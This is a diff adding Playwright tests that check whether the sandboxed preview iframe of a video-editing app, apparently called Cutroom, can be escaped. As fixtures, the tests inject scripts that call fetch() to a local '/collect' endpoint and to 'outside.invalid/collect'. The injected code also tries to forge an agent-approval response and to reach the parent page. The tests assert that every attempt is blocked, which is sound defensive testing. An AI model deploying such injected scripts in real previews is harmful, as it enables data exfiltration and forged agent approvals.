@@ -1,8 +1,161 @@
 import { readFile, writeFile } from "node:fs/promises";
+import { createServer } from "node:http";
 import { join } from "node:path";
-import { expect, test } from "@playwright/test";
-import { ProjectSchema } from "../src/shared/project";
+import { expect, test } from "./fixtures";
+import { ProjectDocumentSchema, ProjectSchema } from "../src/shared/project";
 import { TimelineViewSchema } from "../src/shared/timeline/schema";
+
+test("a sandboxed viewer cannot navigate to an unrestricted preview and send an external request", async ({
+  page,
+  request,
+}) => {
+  let externalRequests = 0;
+  const external = createServer((_request, response) => {
+    externalRequests++;
+    response.writeHead(200, { "Access-Control-Allow-Origin": "*" });
+    response.end("received");
+  });
+  await new Promise<void>((resolve) =>
+    external.listen(0, "127.0.0.1", resolve),
+  );
+  const address = external.address();
+  if (!address || typeof address === "string")
+    throw new Error("The external test server has no TCP address.");
+  try {
+    // A browser permission must not hide a missing server-side boundary.
+    await page.context().grantPermissions(["local-network-access"]);
+    const project = ProjectSchema.parse(
+      await (
+        await request.post("/api/cutroom/projects", {
+          data: { name: "Navigation isolation" },
+        })
+      ).json(),
+    );
+    const oldPreview = `/api/projects/${project.id}/preview/evil.html`;
+    await writeFile(
+      join(project.path, "evil.html"),
+      `<!doctype html><html><body id="escaped"><script>
+      fetch(${JSON.stringify(`http://127.0.0.1:${address.port}/collect?marker=escaped-preview`)});
+    </script></body></html>`,
+    );
+    // The old route remains available to the trusted parent and native clients.
+    expect((await request.get(oldPreview)).status()).toBe(200);
+    await page.addInitScript(() => {
+      if (window === window.top)
+        localStorage.setItem("cutroom.newEditor", "true");
+    });
+    await page.goto(`/#project/${project.id}`);
+    await expect(
+      page.frameLocator("iframe[data-live]").locator("#headline"),
+    ).toHaveText(project.name);
+    const iframe = page.locator("iframe[data-live]");
+    const element = await iframe.elementHandle();
+    const frame = await element?.contentFrame();
+    if (!frame) throw new Error("The live preview frame is missing.");
+    // Exercise server enforcement without relying on Connection-Allowlist support.
+    // Reload the resolved URL because Playwright cannot intercept a redirect's target.
+    await page.route("**/api/isolated/**", async (route) => {
+      const response = await route.fetch();
+      const headers = response.headers();
+      delete headers["connection-allowlist"];
+      await route.fulfill({ response, headers });
+    });
+    const reloaded = page.waitForResponse(
+      (response) =>
+        response.url() === frame.url() &&
+        response.request().isNavigationRequest(),
+    );
+    await iframe.evaluate(
+      (element, url) => element.setAttribute("src", url),
+      frame.url(),
+    );
+    await reloaded;
+    await expect(frame.locator("#headline")).toHaveText(project.name);
+    const navigated = page.waitForResponse(
+      (response) =>
+        response.url().endsWith(oldPreview) &&
+        response.request().isNavigationRequest(),
+    );
+    await frame.evaluate((url) => {
+      location.href = url;
+    }, oldPreview);
+    const response = await navigated;
+    await frame.waitForLoadState("networkidle");
+    expect(externalRequests).toBe(0);
+    expect(response.status()).toBe(403);
+    await expect(frame.locator("#escaped")).toHaveCount(0);
+  } finally {
+    await new Promise<void>((resolve, reject) =>
+      external.close((error) => (error ? reject(error) : resolve())),
+    );
+  }
+});
+
+test("the new viewer refuses composition API calls and parent access while remaining playable", async ({
+  page,
+  request,
+}, testInfo) => {
+  const project = ProjectSchema.parse(
+    await (
+      await request.post("/api/cutroom/projects", {
+        data: { name: "Untrusted preview" },
+      })
+    ).json(),
+  );
+  const index = join(project.path, "index.html");
+  const source = await readFile(index, "utf8");
+  const script = `<script>
+    (async () => {
+      const results = {};
+      const post = body => ({method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(body)});
+      const attempts = {
+        annotation: () => fetch("/api/cutroom/projects/${project.id}/annotations", post({kind:"comment",body:"untrusted",time:0})),
+        approval: () => fetch("/api/cutroom/agents/sessions/forbidden/responses", post({requestId:"approval",decision:"allow"})),
+        projects: () => fetch("/api/cutroom/projects"),
+        parent: () => parent.document.body,
+        external: () => fetch("https://outside.invalid/collect")
+      };
+      for (const [name, attempt] of Object.entries(attempts)) {
+        try { await attempt(); results[name] = "allowed"; } catch { results[name] = "blocked"; }
+      }
+      document.querySelector("main").setAttribute("data-attacks", JSON.stringify(results));
+    })();
+  </script>`;
+  await writeFile(index, source.replace("</body>", `${script}</body>`));
+  await page.addInitScript(() =>
+    localStorage.setItem("cutroom.newEditor", "true"),
+  );
+  await page.goto(`/#project/${project.id}`);
+  const live = page.frameLocator("iframe[data-live]");
+  await expect(live.locator("main")).toHaveAttribute(
+    "data-attacks",
+    JSON.stringify({
+      annotation: "blocked",
+      approval: "blocked",
+      projects: "blocked",
+      parent: "blocked",
+      external: "blocked",
+    }),
+  );
+  await expect(page.locator("iframe[data-live]")).toHaveAttribute(
+    "sandbox",
+    "allow-scripts",
+  );
+  const document = ProjectDocumentSchema.parse(
+    await (
+      await request.get(`/api/cutroom/projects/${project.id}/document`)
+    ).json(),
+  );
+  expect(document.annotations).toEqual([]);
+  await page.getByRole("region", { name: "Viewer" }).click();
+  await page.keyboard.press("l");
+  await expect(
+    page.getByRole("button", { name: /^Current time/ }),
+  ).not.toHaveText("00:00:00:00");
+  await page.keyboard.press("k");
+  await expect(page.locator(".status-error")).toHaveCount(0);
+  await page.screenshot({ path: testInfo.outputPath("isolated-viewer.png") });
+});
 
 test("the new editor plays, steps, and marks in and out as undoable timeline edits", async ({
   page,
